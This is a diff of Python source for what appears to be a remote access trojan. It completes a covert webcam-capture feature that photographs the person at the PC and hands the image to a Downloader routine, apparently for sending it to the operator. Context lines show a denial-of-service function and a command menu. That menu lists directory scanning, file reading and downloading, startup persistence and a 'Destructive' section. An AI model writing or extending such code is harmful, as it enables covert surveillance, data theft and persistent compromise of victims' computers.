@@ -950,22 +950,28 @@ def torbDoS(ddsHost):
     print "%s : %s" % (xdd,ydd)
     run(xdd,ydd)
 
-# This feature is unfinished....
-# Wecam capture under-construction
+# Webcam Screenshot Capture
+# Snap a photo of the person using the PC
 def webcam_Capture():
+	global usrHandle
+	global envoDr
+
 	cap = cv2.VideoCapture(0)
 
 	ret, frame = cap.read()
 	rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)
 
 	cv2.imshow('frame', rgb)
+	
 	# Save web cam screenshot...
-	out = cv2.imwrite('wc_capture.jpg', frame)
+	usrHandle = os.environ['USERNAME']
+	envoDr = 'C:\Users\%s\Downloads\wc_ss.png' % (usrHandle)
+	out = cv2.imwrite(envoDr, frame)
 
 	cap.release()
 	cv2.destroyAllWindows()
 	# Deliver web cam screenshot...
-	Downloader('wc_capture.jpg')
+	Downloader(envoDr)
 
 cmdList = """
 [Fun]:
@@ -983,7 +989,7 @@ cmdList = """
 	scandir [dir] - Scan Directory
 	read [dir] - Read File Content
 	download [dir] - Download File
-	webcamview - Take Web Cam Screenshot (un-finished)
+	webcamview - Take Web Cam Screenshot
 	startup - Embed to Startup
 
 [Destructive]:
